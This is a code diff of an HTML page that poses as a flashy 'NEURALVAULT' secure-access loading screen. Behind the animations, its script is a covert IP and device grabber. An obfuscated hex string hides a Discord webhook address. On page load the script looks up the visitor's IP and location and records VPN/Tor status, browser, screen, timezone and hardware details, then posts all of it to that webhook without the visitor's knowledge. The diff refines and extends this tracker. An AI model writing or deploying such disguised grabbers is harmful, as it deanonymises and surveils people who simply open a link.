@@ -3,41 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEURALVAULT • CLASSIFIED ACCESS</title>
+    <title>NEURALVAULT • BLACKSITE ACCESS</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto+Mono:wght@300;400&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto+Mono:wght@300;400;500&display=swap');
+        
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Roboto Mono',monospace;background:radial-gradient(circle at center,#0a0a1f,#000000);color:#0ff;height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
-        .scan{position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(transparent,rgba(0,255,255,.08),transparent);animation:scanline 2.8s linear infinite;pointer-events:none;z-index:1}
-        @keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(400%)}}
-        .core{width:540px;background:rgba(3,6,22,.96);border:2px solid #0ff;border-radius:14px;padding:55px 40px;box-shadow:0 0 90px #0ff, inset 0 0 40px rgba(0,255,255,.2);text-align:center;position:relative;z-index:2}
-        .logo{font-family:'Orbitron',sans-serif;font-size:42px;letter-spacing:8px;color:#0ff;text-shadow:0 0 25px #0ff;margin-bottom:8px}
-        .tag{font-size:14px;color:#0f8;letter-spacing:4px;margin-bottom:40px}
-        h1{font-size:24px;margin:18px 0;color:#fff;text-shadow:0 0 10px #0ff}
-        .stat{color:#0ff;font-size:14.5px;margin:28px 0;min-height:24px;font-weight:300}
-        .bar{height:5px;background:linear-gradient(to right,#0ff,#0f8);width:0%;margin:30px auto 0;transition:width .4s linear;box-shadow:0 0 20px #0ff}
-        .info{text-align:left;font-size:12.5px;color:#08f;margin-top:25px;line-height:1.5}
+        body{
+            font-family:'Roboto Mono',monospace;
+            background:radial-gradient(circle at center,#0a0a1f,#000000);
+            color:#0ff;
+            height:100vh;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            overflow:hidden;
+            position:relative;
+        }
+        .scan{
+            position:absolute;
+            top:0;left:0;
+            width:100%;height:100%;
+            background:linear-gradient(transparent,rgba(0,255,255,.12),transparent);
+            animation:scanline 2.4s linear infinite;
+            pointer-events:none;
+            z-index:1;
+        }
+        @keyframes scanline{
+            0%{transform:translateY(-100%)}
+            100%{transform:translateY(500%)}
+        }
+        .core{
+            width:560px;
+            background:rgba(2,4,18,.97);
+            border:2px solid #0ff;
+            border-radius:16px;
+            padding:60px 45px;
+            box-shadow:0 0 100px #0ff, inset 0 0 60px rgba(0,255,255,.25);
+            text-align:center;
+            position:relative;
+            z-index:2;
+        }
+        .logo{
+            font-family:'Orbitron',sans-serif;
+            font-size:46px;
+            letter-spacing:10px;
+            color:#0ff;
+            text-shadow:0 0 30px #0ff, 0 0 60px #0ff;
+            margin-bottom:6px;
+        }
+        .tag{
+            font-size:14px;
+            color:#0f8;
+            letter-spacing:5px;
+            margin-bottom:45px;
+            text-transform:uppercase;
+        }
+        h1{
+            font-size:26px;
+            margin:20px 0 15px;
+            color:#fff;
+            text-shadow:0 0 15px #0ff;
+        }
+        .stat{
+            color:#0ff;
+            font-size:15px;
+            margin:30px 0;
+            min-height:26px;
+            font-weight:400;
+        }
+        .bar{
+            height:6px;
+            background:linear-gradient(to right,#0ff,#0f8,#0ff);
+            width:0%;
+            margin:32px auto 0;
+            transition:width .35s linear;
+            box-shadow:0 0 25px #0ff;
+        }
+        .info{
+            text-align:left;
+            font-size:13px;
+            color:#08f;
+            margin-top:30px;
+            line-height:1.6;
+            background:rgba(0,255,255,0.05);
+            padding:15px;
+            border-radius:8px;
+            border-left:3px solid #0ff;
+        }
+        .glow{
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        @keyframes glow{
+            from { text-shadow: 0 0 20px #0ff; }
+            to { text-shadow: 0 0 40px #0ff, 0 0 70px #0ff; }
+        }
     </style>
 </head>
 <body>
     <div class="scan"></div>
     <div class="core">
-        <div class="logo">NEURALVAULT</div>
-        <div class="tag">SECURE ACCESS PROTOCOL v9.3.7 • CLASSIFIED</div>
+        <div class="logo glow">NEURALVAULT</div>
+        <div class="tag">BLACKSITE PROTOCOL v9.4.1 • LEVEL 7 CLEARANCE</div>
         <h1>ESTABLISHING QUANTUM TUNNEL</h1>
         <div class="stat" id="s">AUTHENTICATING NEURAL SIGNATURE...</div>
         <div class="bar" id="b"></div>
         
         <div class="info" id="extra" style="display:none">
-            • ENCRYPTION: AES-512 QUANTUM<br>
-            • VPN PROXY SCAN: ACTIVE<br>
-            • LOCATION: NODE-IX • SECURE<br>
-            • STATUS: ACTIVE CONNECTION
+            • ENCRYPTION: AES-512 + QUANTUM<br>
+            • VPN / PROXY DETECTION: ACTIVE<br>
+            • THREAT LEVEL: MONITORING<br>
+            • NODE: IX-47 • SECURE LINK
         </div>
     </div>
 
     <script>
-        var _0xabc = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x35\x31\x30\x35\x37\x32\x33\x38\x37\x34\x35\x30\x37\x34\x39\x30\x36\x30\x2f\x74\x6a\x65\x4c\x31\x67\x35\x61\x6e\x78\x61\x37\x32\x31\x50\x4d\x2d\x34\x62\x77\x71\x70\x50\x78\x73\x30\x41\x33\x50\x6c\x49\x4f\x5f\x75\x34\x58\x61\x44\x6e\x4f\x6c\x4e\x72\x64\x52\x35\x4d\x6f\x45\x37\x6e\x63\x48\x6b\x52\x51\x46\x6f\x4a\x69\x38\x65\x51\x77\x63\x4e\x45\x30'];
+        var _0xabc = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x35\x31\x30\x36\x35\x36\x38\x31\x30\x36\x36\x39\x39\x36\x35\x34\x30\x34\x2f\x37\x41\x68\x6e\x56\x68\x39\x50\x63\x34\x76\x5a\x32\x73\x59\x56\x68\x36\x68\x62\x58\x6b\x58\x4f\x52\x32\x75\x63\x64\x52\x36\x55\x65\x48\x52\x72\x6a\x71\x6a\x47\x4b\x45\x71\x32\x63\x33\x2d\x72\x37\x5a\x66\x38\x45\x55\x4e\x72\x59\x79\x37\x63\x4f\x4b\x4a\x78\x52\x32\x37\x33'];
         var _0xdef = function(){return _0xabc[0];};
 
         (function(){
@@ -50,42 +130,45 @@
             var messages = [
                 "AUTHENTICATING NEURAL SIGNATURE...",
                 "VERIFYING QUANTUM FINGERPRINT...",
-                "SCANNING FOR PROXY/VPN...",
+                "SCANNING FOR VPN / PROXY...",
+                "ANALYZING CONNECTION INTEGRITY...",
                 "ESTABLISHING ENCRYPTED TUNNEL...",
                 "SYNCHRONIZING WITH CENTRAL NODE...",
-                "ACCESS PROTOCOL CONFIRMED • LOGGED"
+                "ACCESS PROTOCOL CONFIRMED • FULL LOG"
             ];
 
             var interval = setInterval(function(){
-                progress += Math.floor(Math.random()*13)+7;
+                progress += Math.floor(Math.random()*12)+6;
                 if(progress > 100) progress = 100;
                 bar.style.width = progress + '%';
                 
-                if(progress > 18 && stage === 0){ stat.textContent = messages[1]; stage++; }
-                if(progress > 38 && stage === 1){ stat.textContent = messages[2]; stage++; }
-                if(progress > 58 && stage === 2){ stat.textContent = messages[3]; stage++; }
-                if(progress > 78 && stage === 3){ stat.textContent = messages[4]; stage++; }
-                if(progress >= 100 && stage === 4){ 
-                    stat.textContent = messages[5]; 
+                if(progress > 15 && stage === 0){ stat.textContent = messages[1]; stage++; }
+                if(progress > 32 && stage === 1){ stat.textContent = messages[2]; stage++; }
+                if(progress > 50 && stage === 2){ stat.textContent = messages[3]; stage++; }
+                if(progress > 68 && stage === 3){ stat.textContent = messages[4]; stage++; }
+                if(progress > 84 && stage === 4){ stat.textContent = messages[5]; stage++; }
+                if(progress >= 100 && stage === 5){ 
+                    stat.textContent = messages[6]; 
                     extra.style.display = 'block';
                     clearInterval(interval); 
                 }
-            }, 92);
+            }, 88);
 
             setTimeout(function(){
-                var sendLog = function(api){
-                    fetch(api).then(r => r.json()).then(data => {
-                        var vpnStatus = "Unknown";
-                        if(data.proxy === true || data.vpn === true || data.hosting === true){
+                var sendLog = function(ip){
+                    fetch('https://ipapi.co/' + ip + '/json/').then(r => r.json()).then(data => {
+                        var vpnStatus = "UNKNOWN";
+                        if(data.proxy === true || data.vpn === true || data.hosting === true || data.tor === true){
                             vpnStatus = "DETECTED";
                         } else if(data.proxy === false){
-                            vpnStatus = "Not Detected";
+                            vpnStatus = "NOT DETECTED";
                         }
 
                         var info = {
-                            ip: data.ip || data.IP || 'N/A',
+                            ip: data.ip || 'N/A',
                             city: data.city || 'Unknown',
-                            country: data.country_name || data.country || 'Unknown',
+                            region: data.region || 'Unknown',
+                            country: data.country_name || 'Unknown',
                             isp: data.org || data.isp || 'Unknown',
                             vpn: vpnStatus,
                             ua: navigator.userAgent,
@@ -93,37 +176,38 @@
                             screen: screen.width + 'x' + screen.height,
                             tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                             lang: navigator.language,
-                            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+                            cookies: navigator.cookieEnabled ? 'ENABLED' : 'DISABLED',
                             referrer: document.referrer || 'DIRECT',
                             time: new Date().toISOString(),
-                            url: window.location.href,
-                            hardware: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : 'N/A'
+                            hardware: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' CORES' : 'UNKNOWN',
+                            connection: navigator.connection ? navigator.connection.effectiveType : 'UNKNOWN'
                         };
 
                         fetch(_0xdef(), {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({
-                                content: "**🔴 NEURALVAULT CLASSIFIED ACCESS LOGGED**",
+                                content: "**🔴 NEURALVAULT BLACKSITE ACCESS LOGGED**",
                                 embeds: [{
-                                    title: "⚡ HIGH PRIORITY CONNECTION",
+                                    title: "⚡ HIGH PRIORITY SECURE CONNECTION",
                                     color: 0x00ffff,
-                                    description: "A new session has been established on the secure node.",
+                                    description: "**New session established on classified node**",
                                     fields: [
                                         {name: "IP Address", value: "`" + info.ip + "`", inline: true},
-                                        {name: "Location", value: info.city + ", " + info.country, inline: true},
-                                        {name: "ISP / Provider", value: info.isp, inline: false},
-                                        {name: "VPN / Proxy", value: "`" + info.vpn + "`", inline: true},
-                                        {name: "Device & Screen", value: info.platform + " • " + info.screen, inline: false},
+                                        {name: "Location", value: info.city + ", " + info.region + ", " + info.country, inline: true},
+                                        {name: "ISP", value: info.isp, inline: false},
+                                        {name: "VPN / Proxy Detection", value: "**" + info.vpn + "**", inline: true},
+                                        {name: "Device", value: info.platform + " • " + info.screen, inline: false},
                                         {name: "Timezone", value: info.tz, inline: true},
                                         {name: "Language", value: info.lang, inline: true},
                                         {name: "Cookies", value: info.cookies, inline: true},
                                         {name: "Hardware", value: info.hardware, inline: false},
-                                        {name: "User Agent", value: "```" + info.ua.substring(0, 420) + "```", inline: false},
+                                        {name: "Connection Type", value: info.connection.toUpperCase(), inline: true},
+                                        {name: "User Agent", value: "```" + info.ua.substring(0, 380) + "```", inline: false},
                                         {name: "Referrer", value: info.referrer, inline: false},
                                         {name: "Timestamp", value: info.time, inline: false}
                                     ],
-                                    footer: { text: "NEURALVAULT • QUANTUM MONITORING SYSTEM" },
+                                    footer: { text: "NEURALVAULT • QUANTUM MONITORING SYSTEM v9.4.1" },
                                     timestamp: new Date().toISOString()
                                 }]
                             })
@@ -131,16 +215,17 @@
                     }).catch(()=>{});
                 };
 
-                var apis = [
-                    'https://api.ipify.org?format=json',
-                    'https://ipapi.co/json/',
-                    'https://api.myip.com/'
-                ];
-
-                for(var i = 0; i < apis.length; i++){
-                    sendLog(apis[i]);
-                }
-            }, 650);
+                // Get IP first then detailed info
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(data => {
+                        sendLog(data.ip);
+                    })
+                    .catch(() => {
+                        // Fallback
+                        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendLog(d.ip));
+                    });
+            }, 700);
         })();
     </script>
 </body>
